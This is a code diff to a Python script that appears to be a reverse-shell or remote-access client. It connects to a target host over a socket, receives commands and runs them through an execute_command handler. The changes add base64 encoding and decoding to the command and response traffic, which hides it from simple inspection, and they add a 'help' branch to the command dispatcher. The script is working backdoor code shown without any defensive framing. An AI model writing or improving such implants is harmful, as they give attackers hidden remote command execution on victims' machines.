@@ -1,10 +1,10 @@
+import base64
+import os
+import platform
 import socket
 import subprocess
-import os
-from ctypes import *
-import platform
 import time
-
+from ctypes import *
 
 
 def session_handler(sock, target_ip, target_port):
@@ -45,6 +45,8 @@ def process_message(sock, message):
         change_directory(sock, message)
     elif message == 'background':
         pass
+    elif message == 'help':
+        pass
     else:
         execute_command(sock, message)
         return
@@ -76,13 +78,15 @@ def inbound(sock):
     while True:
         try:
             message = sock.recv(1024).decode()
+            message = base64.b64decode(message).decode().strip()
             return message
         except Exception:
             sock.close()
 
 
 def outbound(sock, message):
-    response = str(message).encode()
+    response = str(message)
+    response = base64.b64encode(bytes(response, encoding='utf-8'))
     sock.send(response)
 
 
